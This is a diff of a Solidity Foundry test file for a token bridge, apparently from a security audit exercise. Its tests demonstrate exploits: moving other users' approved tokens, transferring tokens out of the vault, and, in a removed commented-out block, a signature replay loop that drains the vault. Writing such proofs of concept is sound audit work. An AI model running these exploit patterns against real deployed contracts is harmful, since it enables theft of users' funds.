@@ -228,7 +228,6 @@ contract L1BossBridgeTest is Test {
 
 
     function testAnyoneCanMoveApprovedTokens() public {
-
         vm.prank(user);
         token.approve(address(tokenBridge),type(uint256).max);
         uint256 userStartBalance = token.balanceOf(user);
@@ -240,8 +239,8 @@ contract L1BossBridgeTest is Test {
         console2.log("userEndBalance",userEndBalance);
         assertEq(userEndBalance,0);
         assert(token.balanceOf(address(vault)) == userStartBalance);
-
     }
+
 
     function testAnyoneCanTranferFromVault() public {
         address attacker = makeAddr("attacker");
@@ -251,28 +250,10 @@ contract L1BossBridgeTest is Test {
         emit Deposit(address(vault), attacker, amount);
         tokenBridge.depositTokensToL2(address(vault), attacker, amount);
 
+        vm.expectEmit(address(tokenBridge));
+        emit Deposit(address(vault), attacker, amount);
+        tokenBridge.depositTokensToL2(address(vault), attacker, amount);
     }
-
-
-    // function testSignatureReplayAttack() public {
-    //     address attacker = makeAddr("attacker");
-    //     uint256 vaultInitialbalance = 1000e18;
-    //     uint256 attackerInitialbalance = 100e18;
-    //     deal(address(token),address(attacker),attackerInitialbalance);
-    //     deal(address(token),address(vault),vaultInitialbalance);
-    //     vm.startPrank(attacker);
-    //     token.approve(address(tokenBridge),type(uint256).max);
-    //     tokenBridge.depositTokensToL2(attacker, attacker, attackerInitialbalance);
-    //     // user wants to withdraw
-    //     bytes memory message = abi.encode(address(token),0, abi.encodeCall(IERC20.transferFrom,(address(vault),attacker,100e18)));
-    //     (uint8 v,bytes32 r,bytes32 s) = vm.sign(operator.key, MessageHashUtils.toEthSignedMessageHash(keccak256(message)));
-    //     while(token.balanceOf(address(vault)) > 0){
-    //         tokenBridge.withdrawTokensToL1(attacker, attackerInitialbalance, v, r, s);
-    //     }
-    //     vm.stopPrank();
-    //     assertEq(token.balanceOf(address(vault)),0);
-    //     assertEq(token.balanceOf(address(attacker)), attackerInitialbalance + vaultInitialbalance);
-    // }
 
 
 
